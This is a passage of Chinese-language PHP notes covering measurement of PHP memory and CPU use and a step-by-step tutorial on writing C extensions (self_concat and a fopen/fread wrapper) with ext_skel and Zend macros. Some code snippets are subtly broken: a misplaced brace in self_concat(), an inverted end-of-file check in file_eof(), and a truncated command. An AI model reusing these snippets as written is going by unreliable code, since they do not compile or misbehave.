执行完毕之后 我们执行
make && make install
// 然后
ll /www/source/
下面存在nginx 说明我们安装成功
然后我们使用
cd /www/source/nginx/conf
到这里的时候我们基本上已经安装完毕
本次手动编译nginx+php+mysql 就到这里
```

### 如何查看 PHP 进程的内存、CPU 占用
```
1. 查看内存使用情况
观察你程序的内存使用能够让你更好的优化你的代码。
PHP 是有垃圾回收机制的，而且有一套很复杂的内存管理机制。你可以知道你的脚本所使用的内存情况。
要知道当前内存使用情况，你可以使用?memory_get_usage() 函数，如果你想知道使用内存的峰值，
你可以调用memory_get_peak_usage() 函数。
echo "Initial: ".memory_get_usage()." bytes \n";
/* 输出
Initial: 361400 bytes
*/

// 使用内存
for ($i = 0; $i < 100000; $i++) {
$array []= md5($i);
}

// 删除一半的内存
for ($i = 0; $i < 100000; $i++) {
unset($array[$i]);
}

echo "Final: ".memory_get_usage()." bytes \n";
/* prints
Final: 885912 bytes
*/

echo "Peak: ".memory_get_peak_usage()." bytes \n";
/* 输出峰值
Peak: 13687072 bytes
*/

2. 查看CPU使用情况
使用?getrusage() 函数可以让你知道CPU的使用情况。注意，这个功能在Windows下不可用。
print_r(getrusage());
/* 输出
Array
(
[ru_oublock] => 0
[ru_inblock] => 0
[ru_msgsnd] => 2
[ru_msgrcv] => 3
[ru_maxrss] => 12692
[ru_ixrss] => 764
[ru_idrss] => 3864
[ru_minflt] => 94
[ru_majflt] => 0
[ru_nsignals] => 1
[ru_nvcsw] => 67
[ru_nivcsw] => 4
[ru_nswap] => 0
[ru_utime.tv_usec] => 0
[ru_utime.tv_sec] => 0
[ru_stime.tv_usec] => 6269
[ru_stime.tv_sec] => 0
)

*/
这个结构看上出很晦涩，除非你对CPU很了解。下面一些解释：
ru_oublock: 块输出操作
ru_inblock: 块输入操作
ru_msgsnd: 发送的message
ru_msgrcv: 收到的message
ru_maxrss: 最大驻留集大小
ru_ixrss: 全部共享内存大小
ru_idrss:全部非共享内存大小
ru_minflt: 页回收
ru_majflt: 页失效
ru_nsignals: 收到的信号
ru_nvcsw: 主动上下文切换
ru_nivcsw: 被动上下文切换
ru_nswap: 交换区
ru_utime.tv_usec: 用户态时间 (microseconds)
ru_utime.tv_sec: 用户态时间(seconds)
ru_stime.tv_usec: 系统内核时间 (microseconds)
ru_stime.tv_sec: 系统内核时间?(seconds)
```

### 如何给 PHP 增加一个扩展
```
PHP取得成功的一个主要原因之一是她拥有大量的可用扩展。web开发者无论有何种需求，这种需求最有可能在PHP发行包里找到。
PHP发行包包括支持各种数据库，图形文件格式，压缩，XML技术扩展在内的许多扩展。
扩展API的引入使PHP3取得了巨大的进展，扩展API机制使PHP开发社区很容易的开发出几十种扩展。
现在，两个版本过去了，API仍然和PHP3时的非常相似。扩展主要的思想是：
尽可能的从扩展编写者那里隐藏PHP的内部机制和脚本引擎本身，仅仅需要开发者熟悉API。

有两个理由需要自己编写PHP扩展。第一个理由是：PHP需要支持一项她还未支持的技术。
这通常包括包裹一些现成的C函数库，以便提供PHP接口。
例如，如果一个叫FooBase的数据库已推出市场，你需要建立一个PHP扩展帮助你从PHP里调用FooBase的C函数库。
这个工作可能仅由一个人完成，然后被整个PHP社区共享（如果你愿意的话）。
第二个不是很普遍的理由是：你需要从性能或功能的原因考虑来编写一些商业逻辑。
如果以上的两个理由都和你没什么关系，同时你感觉自己没有冒险精神，那么你可以跳过本章。
本章教你如何编写相对简单的PHP扩展，使用一部分扩展API函数。对于大多数打算开发自定义PHP扩展开发者而言，它含概了足够的资料。
学习一门编程课程的最好方法之一就是动手做一些极其简单的例子，这些例子正是本章的线索。
一旦你明白了基础的东西，你就可以在互联网上通过阅读文挡、原代码或参加邮件列表新闻组讨论来丰富自己。
因此，本章集中在让你如何开始的话题。在UNIX下一个叫ext_skel的脚本被用于建立扩展的骨架，
骨架信息从一个描述扩展接口的定义文件中取得。因此你需要利用UNIX来建立一个骨架。
Windows开发者可以使用Windows ext_skel_win32.php代替ext_skel。
然而，本章关于用你开发的扩展编译PHP的指导仅涉及UNIX编译系统。本章中所有的对API的解释与UNIX和Windows下开发的扩展都有联系。
当你阅读完这章，你能学会如何
•建立一个简单的商业逻辑扩展。
•建议个C函数库的包裹扩展，尤其是有些标准C文件操作函数比如fopen()
快速开始
本节没有介绍关于脚本引擎基本构造的一些知识，而是直接进入扩展的编码讲解中，
因此不要担心你无法立刻获得对扩展整体把握的感觉。假设你正在开发一个网站，
需要一个把字符串重复n次的函数。下面是用PHP写的例子：
function self_concat($string, $n){
$result = "";
for($i = 0; $i < $n; $i++){
$result .= $string;
}
return $result;
}
self_concat("One", 3) returns "OneOneOne".
self_concat("One", 1) returns "One".
假设由于一些奇怪的原因，你需要时常调用这个函数，而且还要传给函数很长的字符串和大值n。
这意味着在脚本里有相当巨大的字符串连接量和内存重新分配过程，以至显著地降低脚本执行速度。
如果有一个函数能够更快地分配大量且足够的内存来存放结果字符串，然后把$string重复n次，
就不需要在每次循环迭代中分配内存。
为扩展建立函数的第一步是写一个函数定义文件，该函数定义文件定义了扩展对外提供的函数原形。
该例中，定义函数只有一行函数原形self_concat() :
string self_concat(string str, int n)
函数定义文件的一般格式是一个函数一行。你可以定义可选参数和使用大量的PHP类型，包括: bool, float, int, array等。
保存为myfunctions.def文件至PHP原代码目录树下。
该是通过扩展骨架(skeleton)构造器运行函数定义文件的时机了。
该构造器脚本叫ext_skel，放在PHP原代码目录树的ext/目录下（PHP原码主目录下的README.EXT_SKEL提供了更多的信息）。
假设你把函数定义保存在一个叫做myfunctions.def的文件里，而且你希望把扩展取名为myfunctions，
运行下面的命令来建立扩展骨架
复制代码代码如下:
./ext_skel --extname=myfunctions --proto=myfunctions.de
这个命令在ext/目录下建立了一个myfunctions/目录。你要做的第一件事情也许就是编译该骨架，
以便编写和测试实际的C代码。编译扩展有两种方法：
•作为一个可装载模块或者DSO（动态共享对象）
•静态编译到PHP
PHP扩展开发导图
因为第二种方法比较容易上手，所以本章采用静态编译。如果你对编译可装载扩展模块感兴趣，可以阅读PHP原代码根目录下的README.
SELF-CONTAINED_EXTENSIONS文件。为了使扩展能够被编译，需要修改扩展目录ext/myfunctions/下的config.m4文件。
扩展没有包裹任何外部的C库，你需要添加支持–enable-myfunctions配置开关到PHP编译系统里
（–with-extension 开关用于那些需要用户指定相关C库路径的扩展）。
可以去掉自动生成的下面两行的注释来开启这个配置。
复制代码代码如下:
./ext_skel --extname=myfunctions --proto=myfunctions.def
PHP_ARG_ENABLE(myfunctions, whether to enable myfunctions support,
[ --enable-myfunctions Include myfunctions support]
现在剩下的事情就是在PHP原代码树根目录下运行./buildconf，该命令会生成一个新的配置脚本。
通过查看./configure –help输出信息，可以检查新的配置选项是否被包含到配置文件中。
现在，打开你喜好的配置选项开关和–enable-myfunctions重新配置一下PHP。
最后的但不是最次要的是，用make来重新编译PHP。
ext_skel应该把两个PHP函数添加到你的扩展骨架了：打算实现的self_concat()函数和用于检测myfunctions 是否编译到PHP的confirm_myfunctions_compiled()函数。完成PHP的扩展开发后，可以把后者去掉。

复制代码代码如下:
<?php
print confirm_myfunctions_compiled("myextension");
?>

运行这个脚本会出现类似下面的输出：
复制代码代码如下:
"Congratulations! You have successfully modified ext/myfunctions
config.m4. Module myfunctions is now compiled into PHP.
另外，ext_skel脚本生成一个叫myfunctions.php的脚本，你也可以利用它来验证扩展是否被成功地编译到PHP。
它会列出该扩展所支持的所有函数。
现在你学会如何编译扩展了，该是真正地研究self_concat()函数的时候了。
下面就是ext_skel脚本生成的骨架结构：
复制代码代码如下:
/* {{{ proto string self_concat(string str, int n)
*/
PHP_FUNCTION(self_concat)
{
char *str = NULL;
int argc = ZEND_NUM_ARGS();
int str_len;
long n;
if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE)
return;
php_error(E_WARNING, "self_concat: not yet implemented");
}
/* }}} */


自动生成的PHP函数周围包含了一些注释，这些注释用于自动生成代码文档和vi、Emacs等编辑器的代码折叠。
函数自身的定义使用了宏PHP_FUNCTION()，该宏可以生成一个适合于Zend引擎的函数原型。
逻辑本身分成语义各部分，取得调用函数的参数和逻辑本身。

为了获得函数传递的参数，可以使用zend_parse_parameters()API函数。下面是该函数的原型：
复制代码代码如下:
zend_parse_parameters(int num_args TSRMLS_DC, char *type_spec, …);
第一个参数是传递给函数的参数个数。通常的做法是传给它ZEND_NUM_ARGS()。
这是一个表示传递给函数参数总个数的宏。第二个参数是为了线程安全，总是传递TSRMLS_CC宏，后面会讲到。
第三个参数是一个字符串，指定了函数期望的参数类型，后面紧跟着需要随参数值更新的变量列表。
因为PHP采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。
例如，如果用户传递一个整数变量，可函数需要一个浮点数，那么zend_parse_parameters()就会自动地把整数转换为相应的浮点数。
如果实际值无法转换成期望类型（比如整形到数组形），会触发一个警告。
下表列出了可能指定的类型。我们从完整性考虑也列出了一些没有讨论到的类型。
类型指定符	对应的C类型	描述
l	long	符号整数
d	double	浮点数
s	char *, int	二进制字符串，长度
b	zend_bool	逻辑型（1或0）
r	zval *	资源（文件指针，数据库连接等）
a	zval *	联合数组
o	zval *	任何类型的对象
O	zval *	指定类型的对象。需要提供目标对象的类类型
z	zval *	无任何操作的zval

为了容易地理解最后几个选项的含义，你需要知道zval是Zend引擎的值容器[1]。
无论这个变量是布尔型，字符串型或者其他任何类型，其信息总会包含在一个zval联合体中。
本章中我们不直接存取zval，而是通过一些附加的宏来操作。下面的是或多或少在C中的zval, 以便我们能更好地理解接下来的代码。

复制代码代码如下:
typedef union _zval{
long lval;
double dval;
struct {
char *val;
int len;
}str;
HashTable *ht;
zend_object_value obj;
}zval;

在我们的例子中，我们用基本类型调用zend_parse_parameters()，以本地C类型的方式取得函数参数的值，而不是用zval容器。
为了让zend_parse_parameters()能够改变传递给它的参数的值，并返回这个改变值，需要传递一个引用。仔细查看一下self_concat()：

复制代码代码如下:
if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE)return;
注意到自动生成的代码会检测函数的返回值FAILUER(成功即SUCCESS)来判断是否成功。
如果没有成功则立即返回，并且由zend_parse_parameters()负责触发警告信息。
因为函数打算接收一个字符串l和一个整数n，所以指定 ”sl” 作为其类型指示符。
s需要两个参数，所以我们传递参考char * 和 int (str 和 str_len)给zend_parse_parameters()函数。
无论什么时候，记得总是在代码中使用字符串长度str_len来确保函数工作在二进制安全的环境中。
不要使用strlen()和strcpy()，除非你不介意函数在二进制字符串下不能工作。
二进制字符串是包含有nulls的字符串。二进制格式包括图象文件，压缩文件，可执行文件和更多的其他文件。
”l” 只需要一个参数，所以我们传递给它n的引用。尽管为了清晰起见，
骨架脚本生成的C变量名与在函数原型定义文件中的参数名一样；这样做不是必须的，尽管在实践中鼓励这样做。
回到转换规则中来。下面三个对self_concat()函数的调用使str, str_len和n得到同样的值：

复制代码代码如下:
self_concat("321", 5);
self_concat(321, "5");
self_concat("321", "5");
str points to the string "321", str_len equals 3, and n equals 5.
str 指向字符串"321"，str_len等于3，n等于5
在我们编写代码来实现连接字符串返回给PHP的函数前，还得谈谈两个重要的话题：
内存管理、从PHP内部返回函数值所使用的API。

内存管理
用于从堆中分配内存的PHP API几乎和标准C API一样。在编写扩展的时候，使用下面与C对应（因此不必再解释）的API函数：
复制代码代码如下:
emalloc(size_t size);
efree(void *ptr);
ecalloc(size_t nmemb, size_t size);
erealloc(void *ptr, size_t size);
estrdup(const char *s);
estrndup(const char *s, unsigned int length);
在这一点上，任何一位有经验的C程序员应该象这样思考一下：“什么？标准C没有strndup()？”是的，
这是正确的，因为GNU扩展通常在Linux下可用。estrndup()只是PHP下的一个特殊函数。
它的行为与estrdup()相似，但是可以指定字符串重复的次数（不需要结束空字符），
同时是二进制安全的。这是推荐使用estrndup()而不是estrdup()的原因。
在几乎所有的情况下，你应该使用这些内存分配函数。有一些情况，即扩展需要分配在请求中永久存在的内存，
从而不得不使用malloc()，但是除非你知道你在做什么，你应该始终使用以上的函数。
如果没有使用这些内存函数，而相反使用标准C函数分配的内存返回给脚本引擎，那么PHP会崩溃。
这些函数的优点是：任何分配的内存在偶然情况下如果没有被释放，则会在页面请求的最后被释放。
因此，真正的内存泄漏不会产生。然而，不要依赖这一机制，从调试和性能两个原因来考虑，应当确保释放应该释放的内存。
剩下的优点是在多线程环境下性能的提高，调试模式下检测内存错误等。
还有一个重要的原因，你不需要检查这些内存分配函数的返回值是否为null。
当内存分配失败，它们会发出E_ERROR错误，从而决不会返回到扩展。

从PHP函数中返回值
扩展API包含丰富的用于从函数中返回值的宏。这些宏有两种主要风格：第一种是RETVAL_type()形式，它设置了返回值但C代码继续执行。
这通常使用在把控制交给脚本引擎前还希望做的一些清理工作的时候使用，然后再使用C的返回声明 ”return” 返回到PHP；
后一个宏更加普遍，其形式是RETURN_type()，他设置了返回类型，同时返回控制到PHP。下表解释了大多数存在的宏。

设置返回值并且结束函数	设置返回值	宏返回类型和参数
RETURN_LONG(l)	RETVAL_LONG(l)	整数
RETURN_BOOL(b)	RETVAL_BOOL(b)	布尔数(1或0)
RETURN_NULL()	RETVAL_NULL()	NULL
RETURN_DOUBLE(d)	RETVAL_DOUBLE(d)	浮点数
RETURN_STRING(s, dup)	RETVAL_STRING(s, dup)	字符串。如果dup为1，引擎会调用estrdup()重复s，使用拷贝。如果dup为0，就使用s
RETURN_STRINGL(s, l, dup)	RETVAL_STRINGL(s, l, dup)	长度为l的字符串值。与上一个宏一样，但因为s的长度被指定，所以速度更快。
RETURN_TRUE	RETVAL_TRUE	返回布尔值true。注意到这个宏没有括号。
RETURN_FALSE	RETVAL_FALSE	返回布尔值false。注意到这个宏没有括号。
RETURN_RESOURCE(r)	RETVAL_RESOURCE(r)	资源句柄。

完成self_concat()
现在你已经学会了如何分配内存和从PHP扩展函数里返回函数值，那么我们就能够完成self_concat()的编码：
复制代码代码如下:

/* {{{ proto string self_concat(string str, int n)
*/
PHP_FUNCTION(self_concat)
}
char *str = NULL;
int argc = ZEND_NUM_ARGS();
int str_len;
long n;
char *result; /* Points to resulting string */
char *ptr; /* Points at the next location we want to copy to */
int result_length; /* Length of resulting string */
if (zend_parse_parameters(argc TSRMLS_CC, "sl", &str, &str_len, &n) == FAILURE)
return;
/* Calculate length of result */
result_length = (str_len * n);
/* Allocate memory for result */
result = (char *) emalloc(result_length + 1);
/* Point at the beginning of the result */
ptr = result;
while (n--) {
/* Copy str to the result */
memcpy(ptr, str, str_len);
/* Increment ptr to point at the next position we want to write to */
ptr += str_len;
}
/* Null terminate the result. Always null-terminate your strings
even if they are binary strings */
*ptr = '\0';
/* Return result to the scripting engine without duplicating it*/
RETURN_STRINGL(result, result_length, 0);
}
/* }}} */

现在要做的就是重新编译一下PHP，这样就完成了第一个PHP函数。

让我门检查函数是否真的工作。在最新编译过的PHP树下执行[2]下面的脚本：
复制代码代码如下:

<?php
for ($i = 1; $i <= 3; $i++){
print self_concat("ThisIsUseless", $i);
print "\n";
}
?>

你应该得到下面的结果：
复制代码代码如下:

ThisIsUseless
ThisIsUselessThisIsUseless
ThisIsUselessThisIsUselessThisIsUseles

实例小结
你已经学会如何编写一个简单的PHP函数。回到本章的开头，我们提到用C编写PHP功能函数的两个主要的动机。
第一个动机是用C实现一些算法来提高性能和扩展功能。前一个例子应该能够指导你快速上手这种类型扩展的开发。
第二个动机是包裹三方函数库。我们将在下一步讨论。

包裹第三方的扩展
本节中你将学到如何编写更有用和更完善的扩展。该节的扩展包裹了一个C库，
展示了如何编写一个含有多个互相依赖的PHP函数扩展。

动机
也许最常见的PHP扩展是那些包裹第三方C库的扩展。这些扩展包括MySQL或Oracle的数据库服务库，
libxml2的 XML技术库，ImageMagick 或GD的图形操纵库。

在本节中，我们编写一个扩展，同样使用脚本来生成骨架扩展，因为这能节省许多工作量。
这个扩展包裹了标准C函数fopen(), fclose(), fread(), fwrite()和 feof().

扩展使用一个被叫做资源的抽象数据类型，用于代表已打开的文件FILE*。
你会注意到大多数处理比如数据库连接、文件句柄等的PHP扩展使用了资源类型，这是因为引擎自己无法直接“理解”它们。
我们计划在PHP扩展中实现的C API列表如下：

复制代码代码如下:
FILE *fopen(const char *path, const char *mode);
int fclose(FILE *stream);
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
int feof(FILE *stream);
我们实现这些函数，使它们在命名习惯和简单性上符合PHP脚本。如果你曾经向PHP社区贡献过代码，你被期望遵循一些公共习俗，
而不是跟随C库里的API。并不是所有的习俗都写在PHP代码树的CODING_STANDARDS文件里。
这即是说，此功能已经从PHP发展的很早阶段即被包含在PHP中，并且与C库API类似。
PHP安装已经支持fopen(), fclose()和更多的PHP函数。
以下是PHP风格的API：

复制代码代码如下:
resource file_open(string filename, string mode)
file_open() //接收两个字符串（文件名和模式），返回一个文件的资源句柄。
bool file_close(resource filehandle)
file_close() //接收一个资源句柄，返回真/假指示是否操作成功。
string file_read(resource filehandle, int size)
file_read() //接收一个资源句柄和读入的总字节数，返回读入的字符串。
bool file_write(resource filehandle, string buffer)
file_write() //接收一个资源句柄和被写入的字符串，返回真/假指示是否操作成功。
bool file_eof(resource filehandle)
file_eof() //接收一个资源句柄，返回真/假指示是否到达文件的尾部。
因此，我们的函数定义文件——保存为ext/目录下的myfile.def——内容如下：

复制代码代码如下:
resource file_open(string filename, string mode)
bool file_close(resource filehandle)
string file_read(resource filehandle, int size)
bool file_write(resource filehandle, string buffer)
bool file_eof(resource filehandle)
下一步，利用ext_skel脚本在ext./ 原代码目录执行下面的命令：

复制代码代码如下:
./ext_skel --extname=myfile --proto=myfile.de
然后，按照前一个例子的关于编译新建立脚本的步骤操作。你会得到一些包含FETCH_RESOURCE()宏行的编译错误，
这样骨架脚本就无法顺利完成编译。为了让骨架扩展顺利通过编译，把那些出错行[3]注释掉即可。

资源
资源是一个能容纳任何信息的抽象数据结构。正如前面提到的，这个信息通常包括例如文件句柄、数据库连接结构和其他一些复杂类型的数据。
使用资源的主要原因是因为：资源被一个集中的队列所管理，该队列可以在PHP开发人员没有在脚本里面显式地释放时可以自动地被释放。
举个例子，考虑到编写一个脚本，在脚本里调用mysql_connect()打开一个MySQL连接，
可是当该数据库连接资源不再使用时却没有调用mysql_close()。
在PHP里，资源机制能够检测什么时候这个资源应当被释放，然后在当前请求的结尾或通常情况下更早地释放资源。
这就为减少内存泄漏赋予了一个“防弹”机制。如果没有这样一个机制，经过几次web请求后，web服务器也许会潜在地泄漏许多内存资源，
从而导致服务器当机或出错。

注册资源类型
如何使用资源？Zend引擎让使用资源变地非常容易。你要做的第一件事就是把资源注册到引擎中去。使用这个API函数：
int zend_register_list_destructors_ex(rsrc_dtor_func_t ld, rsrc_dtor_func_t pld, char *type_name, int module_number)
这个函数返回一个资源类型id，该id应当被作为全局变量保存在扩展里，以便在必要的时候传递给其他资源API。
ld：该资源释放时调用的函数。pld用于在不同请求中始终存在的永久资源，本章不会涉及。
type_name是一个具有描述性类型名称的字符串，module_number为引擎内部使用，当我们调用这个函数时，
我们只需要传递一个已经定义好的module_number变量。

回到我们的例子中来：我们会添加下面的代码到myfile.c原文件中。该文件包括了资源释放函数的定义，
此资源函数被传递给zend_register_list_destructors_ex()注册函数（资源释放函数应该提早添加到文件中，
以便在调用zend_register_list_destructors_ex()时该函数已被定义）：

复制代码代码如下:
static void myfile_dtor(zend_rsrc_list_entry *rsrc TSRMLS_DC){
FILE *fp = (FILE *) rsrc->ptr;
fclose(fp);
}
把注册行添加到PHP_MINIT_FUNCTION()后，看起来应该如下面的代码：
复制代码代码如下:
PHP_MINIT_FUNCTION(myfile){
/* If you have INI entries, uncomment these lines
ZEND_INIT_MODULE_GLOBALS(myfile, php_myfile_init_globals,NULL);
REGISTER_INI_ENTRIES();
*/
le_myfile = zend_register_list_destructors_ex(myfile_dtor,NULL,"standard-c-file", module_number);
return SUCCESS;
}
l 注意到le_myfile是一个已经被ext_skel脚本定义好的全局变量。
PHP_MINIT_FUNCTION()是一个先于模块（扩展）的启动函数，是暴露给扩展的一部分API。下表提供可用函数简要的说明。
函数声明宏	语义
PHP_MINIT_FUNCTION()	当PHP被装载时，模块启动函数即被引擎调用。这使得引擎做一些例如资源类型，注册INI变量等的一次初始化。
PHP_MSHUTDOWN_FUNCTION()	当PHP完全关闭时，模块关闭函数即被引擎调用。通常用于注销INI条目
PHP_RINIT_FUNCTION()	在每次PHP请求开始，请求前启动函数被调用。通常用于管理请求前逻辑。
PHP_RSHUTDOWN_FUNCTION()	在每次PHP请求结束后，请求前关闭函数被调用。经常应用在清理请求前启动函数的逻辑。
PHP_MINFO_FUNCTION()	调用phpinfo()时模块信息函数被呼叫，从而打印出模块信息。
新建和注册新资源 我们准备实现file_open()函数。当我们打开文件得到一个FILE *，我们需要利用资源机制注册它。下面的主要宏实现注册功能：

复制代码代码如下:
ZEND_REGISTER_RESOURCE(rsrc_result, rsrc_pointer, rsrc_type);
参考表格对宏参数的解释
ZEND_REGISTER_RESOURCE 宏参数
宏参数	参数类型
rsrc_result	zval *, which should be set with the registered resource information. zval * 设置为已注册资源信息
rsrc_pointer	Pointer to our resource data. 资源数据指针
rsrc_type	The resource id obtained when registering the resource type. 注册资源类型时获得的资源id

文件函数
现在你知道了如何使用ZEND_REGISTER_RESOURCE()宏，并且准备好了开始编写file_open()函数。还有一个主题我们需要讲述。
当PHP运行在多线程服务器上，不能使用标准的C文件存取函数。
这是因为在一个线程里正在运行的PHP脚本会改变当前工作目录，因此另外一个线程里的脚本使用相对路径则无法打开目标文件。
为了阻止这种错误发生，PHP框架提供了称作VCWD （virtual current working directory 虚拟当前工作目录）宏，
用来代替任何依赖当前工作目录的存取函数。这些宏与被替代的函数具备同样的功能，同时是被透明地处理。
在某些没有标准C函数库平台的情况下，VCWD框架则不会得到支持。
例如，Win32下不存在chown()，就不会有相应的VCWD_CHOWN()宏被定义。

VCWD列表
标准C库	VCWD宏
getcwd()	VCWD_GETCWD()
fopen()	VCWD_FOPEN
open()	VCWD_OPEN() //用于两个参数的版本
open()	VCWD_OPEN_MODE() //用于三个参数的open()版本
creat()	VCWD_CREAT()
chdir()	VCWD_CHDIR()
getwd()	VCWD_GETWD()
realpath()	VCWD_REALPATH()
rename()	VCWD_RENAME()
stat()	VCWD_STAT()
lstat()	VCWD_LSTAT()
unlink()	VCWD_UNLINK()
mkdir()	VCWD_MKDIR()
rmdir()	VCWD_RMDIR()
opendir()	VCWD_OPENDIR()
popen()	VCWD_POPEN()
access()	VCWD_ACCESS()
utime()	VCWD_UTIME()
chmod()	VCWD_CHMOD()
chown()	VCWD_CHOWN()

编写利用资源的第一个PHP函数
实现file_open()应该非常简单，看起来像下面的样子：

复制代码代码如下:
PHP_FUNCTION(file_open){
char *filename = NULL;
char *mode = NULL;
int argc = ZEND_NUM_ARGS();
int filename_len;
int mode_len;
FILE *fp;
if (zend_parse_parameters(argc TSRMLS_CC, "ss", &filename,&filename_len, &mode, &mode_len) == FAILURE) {
return;
}
fp = VCWD_FOPEN(filename, mode);
if (fp == NULL) {
RETURN_FALSE;
}
ZEND_REGISTER_RESOURCE(return_value, fp, le_myfile);
}

你可能会注意到资源注册宏的第一个参数return_value，可此地找不到它的定义。
这个变量自动的被扩展框架定义为zval * 类型的函数返回值。
先前讨论的、能够影响返回值的RETURN_LONG() 和RETVAL_BOOL()宏确实改变了return_value的值。
因此很容易猜到程序注册了我们取得的文件指针fp，同时设置return_value为该注册资源。

访问资源 需要使用下面的宏访问资源（参看表对宏参数的解释）
复制代码代码如下:
ZEND_FETCH_RESOURCE(rsrc, rsrc_type, passed_id, default_id, resource_type_name, resource_type);
ZEND_FETCH_RESOURCE 宏参数
参数	含义
rsrc	资源值保存到的变量名。它应该和资源有相同类型。
rsrc_type	rsrc的类型，用于在内部把资源转换成正确的类型
passed_id	寻找的资源值(例如zval **)
default_id	如果该值不为-1，就使用这个id。用于实现资源的默认值。
resource_type_name	资源的一个简短名称，用于错误信息。
resource_type	注册资源的资源类型id

使用这个宏，我们现在能够实现file_eof()：
复制代码代码如下:
PHP_FUNCTION(file_eof){
int argc = ZEND_NUM_ARGS();
zval *filehandle = NULL;
FILE *fp;
if (zend_parse_parameters(argc TSRMLS_CC, "r", &filehandle) ==FAILURE) {
return;
}
ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-c-file",le_myfile);
if (fp == NULL){
RETURN_FALSE;
}
if (feof(fp) <= 0) {
/* Return eof also if there was an error */
RETURN_TRUE;
}
RETURN_FALSE;
}

删除一个资源通常使用下面这个宏删除一个资源：
复制代码代码如下:
int zend_list_delete(int id)
传递给宏一个资源id，返回SUCCESS或者FAILURE。如果资源存在，优先从Zend资源列队中删除，该过程中会调用该资源类型的已注册资源清理函数。
因此，在我们的例子中，不必取得文件指针，调用fclose()关闭文件，然后再删除资源。直接把资源删除掉即可。
使用这个宏，我们能够实现file_close()：
复制代码代码如下:
PHP_FUNCTION(file_close){
int argc = ZEND_NUM_ARGS();
zval *filehandle = NULL;
if (zend_parse_parameters(argc TSRMLS_CC, "r", &filehandle) == FAILURE) {
return;
}
if (zend_list_delete(Z_RESVAL_P(filehandle)) == FAILURE) {
RETURN_FALSE;
}
RETURN_TRUE;
}

你肯定会问自己Z_RESVAL_P()是做什么的。当我们使用zend_parse_parameters()从参数列表中取得资源的时候，得到的是zval的形式。
为了获得资源id，我们使用Z_RESVAL_P()宏得到id，然后把id传递给zend_list_delete()。
有一系列宏用于访问存储于zval值（参考表的宏列表）。尽管在大多数情况下zend_parse_parameters()返回与c类型相应的值，
我们仍希望直接处理zval，包括资源这一情况。

Zval访问宏
宏	访问对象	C 类型
Z_LVAL, Z_LVAL_P, Z_LVAL_PP	整型值	long
Z_BVAL, Z_BVAL_P, Z_BVAL_PP	布尔值	zend_bool
Z_DVAL, Z_DVAL_P, Z_DVAL_PP	浮点值	double
Z_STRVAL, Z_STRVAL_P, Z_STRVAL_PP	字符串值	char *
Z_STRLEN, Z_STRLEN_P, Z_STRLEN_PP	字符串长度值	int
Z_RESVAL, Z_RESVAL_P,Z_RESVAL_PP	资源值	long
Z_ARRVAL, Z_ARRVAL_P, Z_ARRVAL_PP	联合数组	HashTable *
Z_TYPE, Z_TYPE_P, Z_TYPE_PP	Zval类型	Enumeration (IS_NULL, IS_LONG, IS_DOUBLE, IS_STRING, IS_ARRAY, IS_OBJECT, IS_BOOL, IS_RESOURCE)
Z_OBJPROP, Z_OBJPROP_P, Z_OBJPROP_PP	对象属性hash（本章不会谈到）	HashTable *
Z_OBJCE, Z_OBJCE_P, Z_OBJCE_PP	对象的类信息	zend_class_entry
用于访问zval值的宏
所有的宏都有三种形式：一个是接受zval s，另外一个接受zval *s，最后一个接受zval **s。
它们的区别是在命名上，第一个没有后缀，zval *有后缀_P（代表一个指针），
最后一个 zval **有后缀_PP（代表两个指针）。
现在，你有足够的信息来独立完成 file_read()和 file_write()函数。这里是一个可能的实现：

复制代码代码如下:
PHP_FUNCTION(file_read){
int argc = ZEND_NUM_ARGS();
long size;
zval *filehandle = NULL;
FILE *fp;
char *result;
size_t bytes_read;
if (zend_parse_parameters(argc TSRMLS_CC, "rl", &filehandle,&size) == FAILURE) {
return;
}
ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-cfile", le_myfile);
result = (char *) emalloc(size+1);
bytes_read = fread(result, 1, size, fp);
result[bytes_read] = '\0';
RETURN_STRING(result, 0);
}
PHP_FUNCTION(file_write){
char *buffer = NULL;
int argc = ZEND_NUM_ARGS();
int buffer_len;
zval *filehandle = NULL;
FILE *fp;
if (zend_parse_parameters(argc TSRMLS_CC, "rs", &filehandle,&buffer, &buffer_len) == FAILURE) {
return;
}
ZEND_FETCH_RESOURCE(fp, FILE *, &filehandle, -1, "standard-cfile", le_myfile);
if (fwrite(buffer, 1, buffer_len, fp) != buffer_len) {
RETURN_FALSE;
}
RETURN_TRUE;
}

测试扩展
你现在可以编写一个测试脚本来检测扩展是否工作正常。下面是一个示例脚本，该脚本打开文件test.txt，
输出文件类容到标准输出，建立一个拷贝test.txt.new。
复制代码代码如下:

<?php
$fp_in = file_open("test.txt", "r") or die("Unable to open input file\n");
$fp_out = file_open("test.txt.new", "w") or die("Unable to open output file\n");
while (!file_eof($fp_in)) {
$str = file_read($fp_in, 1024);
print($str);
file_write($fp_out, $str);
}
file_close($fp_in);
file_close($fp_out);
?>

全局变量
你可能希望在扩展里使用全局C变量，无论是独自在内部使用或访问php.ini文件中的INI扩展注册标记（INI在下一节中讨论）。
因为PHP是为多线程环境而设计，所以不必定义全局变量。PHP提供了一个创建全局变量的机制，可以同时应用在线程和非线程环境中。
我们应当始终利用这个机制，而不要自主地定义全局变量。用一个宏访问这些全局变量，使用起来就像普通全局变量一样。

用于生成myfile工程骨架文件的ext_skel脚本创建了必要的代码来支持全局变量。通过检查php_myfile.h文件，
你应当发现类似下面的被注释掉的一节，
复制代码代码如下:
ZEND_BEGIN_MODULE_GLOBALS(myfile)
int global_value;
char *global_string;
ZEND_END_MODULE_GLOBALS(myfile)
你可以把这一节的注释去掉，同时添加任何其他全局变量于这两个宏之间。文件后部的几行，骨架脚本自动地定义一个MYFILE_G(v)宏。
这个宏应当被用于所有的代码，以便访问这些全局变量。
这就确保在多线程环境中，访问的全局变量仅是一个线程的拷贝，而不需要互斥的操作。

为了使全局变量有效，最后需要做的是把myfile.c：
复制代码代码如下:

ZEND_DECLARE_MODULE_GLOBALS(myfile)

注释去掉。

你也许希望在每次PHP请求的开始初始化全局变量。另外，做为一个例子，全局变量已指向了一个已分配的内存，
在每次PHP请求结束时需要释放内存。为了达到这些目的，全局变量机制提供了一个特殊的宏，
